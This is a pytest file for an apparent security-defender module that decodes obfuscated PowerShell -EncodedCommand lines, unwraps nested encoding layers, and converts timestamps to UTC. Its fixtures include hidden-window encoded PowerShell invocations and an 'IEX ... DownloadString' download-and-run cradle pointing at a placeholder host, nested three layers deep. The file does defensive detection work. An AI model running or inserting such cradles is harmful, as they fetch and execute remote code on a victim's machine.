from __future__ import annotations

import base64

import pytest
from zerosoc_defender_xdr.decode import ROUNDS, decode_encoded_command, decode_layers, to_utc


def encoded(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


@pytest.mark.parametrize(
    "flag", ["-EncodedCommand", "-enc", "-e", "-ec", "-ENCODEDC", "/enc", "\u2013enc"]
)
def test_every_spelling_of_the_flag_is_decoded(flag: str) -> None:
    line = f"powershell.exe -NoP -W Hidden {flag} {encoded('whoami /all')}"
    assert decode_encoded_command(line) == "whoami /all"


def test_a_quoted_payload_is_decoded() -> None:
    assert decode_encoded_command(f'pwsh -enc "{encoded("Get-Process")}"') == "Get-Process"


def test_a_bare_payload_is_decoded() -> None:
    assert decode_encoded_command(encoded("IEX (New-Object Net.WebClient)")) == (
        "IEX (New-Object Net.WebClient)"
    )


@pytest.mark.parametrize(
    "line",
    [
        "powershell.exe -ExecutionPolicy Bypass -File run.ps1",
        "cmd.exe /c echo hello",
        "powershell -enc !!!not-base64!!!",
        "powershell -enc QQ==",  # one byte: not UTF-16
        "",
    ],
)
def test_a_line_without_a_decodable_payload_gives_none(line: str) -> None:
    assert decode_encoded_command(line) is None


def test_execution_policy_is_not_mistaken_for_the_flag() -> None:
    line = f"powershell -ep bypass -e {encoded('hostname')}"
    assert decode_encoded_command(line) == "hostname"


@pytest.mark.parametrize(
    ("given", "expected"),
    [
        ("2026-09-10T12:34:56Z", "2026-09-10T12:34:56Z"),
        ("2026-09-10T14:34:56+02:00", "2026-09-10T12:34:56Z"),
        ("2026-09-10T12:34:56.1234567Z", "2026-09-10T12:34:56.123456Z"),
        ("2026-09-10T12:34:56.5Z", "2026-09-10T12:34:56.5Z"),
        ("2026-09-10T12:34:56", "2026-09-10T12:34:56Z"),
        ("2026-09-10 12:34:56", "2026-09-10T12:34:56Z"),
    ],
)
def test_timestamps_are_normalized_to_utc(given: str, expected: str) -> None:
    assert to_utc(given) == expected


def test_a_local_time_is_converted_with_the_zone_the_caller_names() -> None:
    assert to_utc("2026-09-10T14:34:56", assume_zone="Europe/Rome") == "2026-09-10T12:34:56Z"
    assert to_utc("2026-01-10T14:34:56", assume_zone="Europe/Rome") == "2026-01-10T13:34:56Z"


def test_an_explicit_offset_wins_over_the_assumed_zone() -> None:
    assert to_utc("2026-09-10T14:34:56+00:00", assume_zone="Europe/Rome") == "2026-09-10T14:34:56Z"


def test_what_is_not_a_timestamp_is_refused() -> None:
    with pytest.raises(ValueError, match="not a timestamp"):
        to_utc("yesterday")
    with pytest.raises(ValueError, match="unknown time zone"):
        to_utc("2026-09-10T14:34:56", assume_zone="Mars/Olympus")


def wrap(script: str, times: int) -> str:
    """A command line whose payload is encoded `times` over, as a nested loader does it."""
    line = script
    for _ in range(times):
        line = f"powershell.exe -NoProfile -EncodedCommand {encoded(line)}"
    return line


def test_one_layer_is_one_round() -> None:
    result = decode_layers(wrap("whoami /all", 1))
    assert result["decoded"] == "whoami /all"
    assert (result["rounds"], result["capped"]) == (1, False)


def test_a_decoding_that_is_itself_encoded_is_decoded_again() -> None:
    result = decode_layers(wrap("IEX (New-Object Net.WebClient).DownloadString('http://x/a')", 3))
    assert result["decoded"] == "IEX (New-Object Net.WebClient).DownloadString('http://x/a')"
    assert (result["rounds"], result["capped"]) == (3, False)
    assert len(result["layers"]) == 3


def test_the_rounds_are_capped_and_the_cap_is_reported() -> None:
    result = decode_layers(wrap("whoami", 9))
    assert (result["rounds"], result["capped"]) == (ROUNDS, True)
    assert result["decoded"] is not None, (
        "the last decoding reached is kept, the rest is not chased"
    )
    assert decode_encoded_command(wrap("whoami", 9)) == result["decoded"]


def test_a_plain_command_line_has_no_layers() -> None:
    result = decode_layers("cmd.exe /Q /c whoami & hostname")
    assert (result["decoded"], result["rounds"], result["capped"]) == (None, 0, False)


def test_the_cap_is_configurable_for_a_caller_that_needs_fewer() -> None:
    assert decode_layers(wrap("whoami", 3), rounds=2)["rounds"] == 2
    assert decode_layers(wrap("whoami", 3), rounds=2)["capped"] is True
